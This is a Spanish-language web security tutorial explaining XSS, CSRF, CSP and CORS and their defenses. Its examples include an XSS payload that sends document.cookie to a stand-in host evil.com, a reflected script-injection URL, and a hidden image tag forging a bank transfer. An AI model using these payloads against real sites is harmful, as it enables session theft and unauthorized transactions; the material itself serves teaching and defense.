Seguridad Web: XSS, CSRF, CSP y CORS

En resumen: XSS y CSRF son ataques que explotan la forma en que funciona la web. CSP y CORS son mecanismos de defensa. Entender estos cuatro conceptos es obligatorio para cualquier desarrollador web.

1. Cross-Site Scripting (XSS)

XSS ocurre cuando un atacante logra que tu sitio ejecute JavaScript malicioso en el navegador de otro usuario. No es un ataque al servidor: es un ataque a los usuarios que visitan tu sitio.

Imagina un foro donde cualquiera puede escribir comentarios. Si alguien escribe código JavaScript en vez de texto y tu sitio lo muestra tal cual, el navegador de quien lee el comentario ejecuta ese código como si fuera parte de tu página.

XSS Reflejado

El código malicioso viene en la URL. Cuando alguien hace clic en ese enlace, el servidor lo refleja en la respuesta sin sanitizar.


// URL maliciosa
https://tu-sitio.com/buscar?q=<script>steal(cookies)</script>

// El servidor refleja la query en la página sin escape
<p>Resultados para: <script>steal(cookies)</script></p>

XSS Almacenado

El código malicioso se guarda en la base de datos (un comentario, un post, un perfil). Cada vez que alguien lo carga, el navegador lo ejecuta.


// El atacante envía esto como "nombre" en un formulario
'><script>document.location="https://evil.com/robar?c="+document.cookie</script>

// Cuando otro usuario ve el perfil, se ejecuta el script

Defensa contra XSS

  • Escaping: Convierte los caracteres especiales en HTML entities. < se convierte en &lt;.
  • Content Security Policy (CSP): Definí qué scripts puede ejecutar tu página.
  • HttpOnly cookies: JavaScript no puede leerlas, así que un XSS no puede robar la sesión.
  • Sanitización: Limpíá toda entrada del usuario antes de mostrarla.

2. Cross-Site Request Forgery (CSRF)

CSRF engaña al navegador del usuario para que haga una petición que el usuario no autorizó. El truco es que las cookies se envían automáticamente al mismo dominio.

Banco → Usuario sesionado → Sitio malicioso → Banco recibe petición

Ejemplo concreto

Estás logueado en tu banco. Visitás un sitio malicioso que tiene esto en su HTML:


<!-- Oculto, invisible para el usuario -->
<img src="https://tu-banco.com/transferir?destino=atacante&monto=10000"
     style="display:none">

Tu navegador carga la imagen y envía la cookie de sesión automáticamente. El banco no puede distinguir entre tu petición y la del sitio malicioso.

Defensa contra CSRF

  • CSRF Tokens: Un token único que el servidor genera y el formulario debe enviar de vuelta. El atacante no puede adivinarlo.
  • SameSite cookies: La cookie no se envía en peticiones cruzadas.
  • Verificación de Origin/Referer: El servidor revisa de dónde viene la petición.

3. Content Security Policy (CSP)

CSP es un encabezado HTTP que le dice al navegador de qué fuentes está permitido cargar contenido. Es una defensa proactiva contra XSS.


// Permitir scripts solo del mismo dominio
Content-Security-Policy: script-src 'self'

// Permitir scripts de tu dominio y de un CDN específico
Content-Security-Policy: script-src 'self' https://cdn.ejemplo.com

// Bloquear todo script inline (muy estricto)
Content-Security-Policy: script-src 'none'

// Ejemplo completo
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.ejemplo.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.ejemplo.com;

CSP no previene XSS, pero limita el daño. Si un atacante logra inyectar un script, el navegador lo bloquea si no está en la lista de permitidos.

4. Cross-Origin Resource Sharing (CORS)

CORS controla qué dominios pueden acceder a los recursos de tu API desde JavaScript. Sin CORS, el navegador bloquea las peticiones entre dominios diferentes por seguridad.

El problema que resuelve

Si tu API está en api.tu-sitio.com y tu frontend en tu-sitio.com, el navegador bloquea las peticiones porque son "cross-origin". CORS le dice al navegador qué está permitido.


// El navegador envía esto en una petición cross-origin
Origin: https://tu-sitio.com

// El servidor responde con qué orígenes puede acceder
Access-Control-Allow-Origin: https://tu-sitio.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization

Buenas prácticas de CORS

  • Nunca uses Access-Control-Allow-Origin: * en producción. Permite que cualquier sitio acceda a tu API.
  • Lista blanca explícita: Especificá exactamente qué dominios pueden acceder.
  • Limitá métodos y headers: Solo permití lo necesario.
  • Credentials: Si usas cookies o auth headers, configura Access-Control-Allow-Credentials: true y lista blanca de orígenes específicos.

5. Resumen de amenazas y defensas

  • XSS: Inyectar código que se ejecuta en el navegador de la víctima. Defensa: escaping + CSP + HttpOnly cookies.
  • CSRF: Forzar al navegador a hacer peticiones no autorizadas. Defensa: tokens CSRF + SameSite cookies.
  • CSP: Restringe qué código puede ejecutarse. No previene XSS pero limita el daño.
  • CORS: Controla qué dominios pueden acceder a tu API. No es un mecanismo de seguridad per se, pero define los límites de acceso cross-origin.

Regla de oro: Nunca confíes en la entrada del usuario. Siempre sanitiza, valida y escapa. El navegador es el primer filtro de seguridad, pero no el único.
